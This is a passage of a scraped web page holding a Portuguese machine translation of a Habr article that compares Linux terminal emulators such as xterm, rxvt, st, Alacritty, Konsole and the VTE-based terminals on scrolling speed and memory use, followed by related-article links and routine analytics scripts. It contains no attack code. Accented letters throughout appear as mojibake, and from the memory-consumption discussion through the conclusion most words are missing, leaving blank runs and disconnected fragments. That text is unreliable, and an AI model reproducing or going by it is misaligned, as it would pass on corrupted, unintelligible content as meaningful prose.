‚Äù </blockquote><br>  Para corrigir essa aparente lentid√£o do xterm, Dickey sugere o uso do recurso <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">fastScroll</a> , que permite ao xterm descartar algumas atualiza√ß√µes da tela para acompanhar o fluxo.  Meus testes confirmam que o fastScroll melhora o desempenho e eleva o xterm ao mesmo n√≠vel que o rxvt.  Essa √©, no entanto, uma muleta bastante grosseira, como explica o pr√≥prio Dickey: "√†s vezes o xterm - como o konsole - parece parar, pois espera um novo conjunto de atualiza√ß√µes de tela depois que algumas delas forem exclu√≠das".  Nesse sentido, parece que outros terminais encontraram o melhor compromisso entre velocidade e integridade da tela. <br><br><h4>  Consumo de recursos </h4><br>  Independentemente da conveni√™ncia de considerar a velocidade de rolagem como um indicador de desempenho, este teste permite simular a carga nos terminais, o que, por sua vez, permite medir outros par√¢metros, como uso de mem√≥ria ou disco.  As m√©tricas foram obtidas executando o teste <b>seq</b> especificado sob o monitoramento do processo Python.  Ele coletou dados do contador <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">getrusage ()</a> para <b>ru_maxrss</b> , a soma de <b>ru_oublock</b> e <b>ru_inblock</b> e um timer simples. <br><br><img src="https://habrastorage.org/webt/e7/ay/fm/e7ayfmzkluchtlybqvqjwmijobs.png"><br><br>  Neste teste, o ST ocupa o primeiro lugar com o menor consumo m√©dio de mem√≥ria de 8 MB, o que n√£o √© surpreendente quando voc√™ considera que a principal id√©ia do projeto √© a simplicidade.  Mlterm, xterm e rxvt consomem um pouco mais - cerca de 12 MB.  Alacritty tem outro resultado not√°vel, que requer 30 MB para funcionar.  Depois, existem terminais da fam√≠lia VTE com indicadores de 40 a 60 MB, o que √© bastante.  Esse consumo pode ser explicado pelo fato de que esses terminais usam bibliotecas de n√≠vel superior, por exemplo, GTK.  O Konsole vem por √∫ltimo com um enorme consumo de 65 MB de mem√≥ria durante os testes, embora isso possa ser justificado por sua ampla gama de fun√ß√µes. <br><br>  Comparado aos resultados anteriores obtidos dez anos atr√°s, todos os programas come√ßaram a consumir significativamente mais mem√≥ria.  Anteriormente, o Xterm exigia 4 MB, mas agora - 15 MB apenas para execu√ß√£o.  O Rxvt tem um aumento semelhante no consumo, que agora requer 16 MB prontos para uso.  O terminal Xfce ocupa 34 MB, tr√™s vezes mais que antes, mas o Terminal GNOME requer apenas 20 MB.  Obviamente, todos os testes anteriores foram realizados em uma arquitetura de 32 bits.  Na ACV de 2012, Rusty Russell <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">disse</a> que existem muitos outros motivos sutis que podem explicar o aumento no consumo de mem√≥ria.  Com tudo isso, agora estamos vivendo uma √©poca em que temos gigabytes de mem√≥ria inteiros, para que possamos lidar com isso de alguma forma. <br><br>  No entanto, n√£o posso deixar de sentir que alocar mais mem√≥ria para um software fundamental como um terminal √© um desperd√≠cio de recursos.        ,       ¬´¬ª,  ,   -   ,      Linux- (  ,     ).                 ,          .   , GNOME Terminal, Konsole, urxvt, Terminator  Xfce Terminal  Daemon-,        ,     . <br><br><img src="https://habrastorage.org/webt/bx/h6/dc/bxh6dcm-ahulyqaioo5vhmuwmea.png"><br><br>              -:       ,  ,         . ,  VTE       (  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">    2010 </a> ,      ).      , ,   ,      AES256 GCM ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">  0.39.2</a> ).    ,       VTE,        ‚Ä¶ <br><br><h4>  Conclus√£o </h4><br>      ,     VTE    ,    ,          .     ,    VTE-    Daemon-,    .   ,  ,          ,  -      ,       .   VTE         (),             GNOME. ,  VTE   .     ,      Linux    ,          .                         -   .  ,   xterm  mlterm        10 ,    . <br><br>    ,  -    Linux      .        ,       .  ,  Wayland    :  Typometer,   ,    ,  Wayland   ‚Äî    .  ,   Wayland   ,  X.org,      ,    -        . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt463785/">https://habr.com/ru/post/pt463785/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt463771/index.html">[Peter] Encontrando JUG.ru com Sebastian Dashner - Torne mais alegre a realiza√ß√£o de testes corporativos</a></li>
<li><a href="../pt463773/index.html">Como √© organizada a prote√ß√£o das crian√ßas contra as informa√ß√µes - e a hist√≥ria encantadora sobre de onde elas vieram (18+)</a></li>
<li><a href="../pt463775/index.html">Quem usa o protocolo de autentica√ß√£o SAML 2.0</a></li>
<li><a href="../pt463777/index.html">Monitoramento de disponibilidade do host do Powershell</a></li>
<li><a href="../pt463781/index.html">Componentes isolados Zen na arquitetura Android</a></li>
<li><a href="../pt463787/index.html">Grande surpresa velha da HP</a></li>
<li><a href="../pt463789/index.html">O poder dos gen√©ricos em Swift. Parte 2</a></li>
<li><a href="../pt463791/index.html">Punho de ferro: cinem√°tica do desembarque de p√°ssaros, dependendo da geometria e textura da superf√≠cie</a></li>
<li><a href="../pt463795/index.html">Tons de significado em ingl√™s: como usar os verbos Aconselhar, Recomendar, Sugerir</a></li>
<li><a href="../pt463799/index.html">O que eu n√£o gosto no Windows 10</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>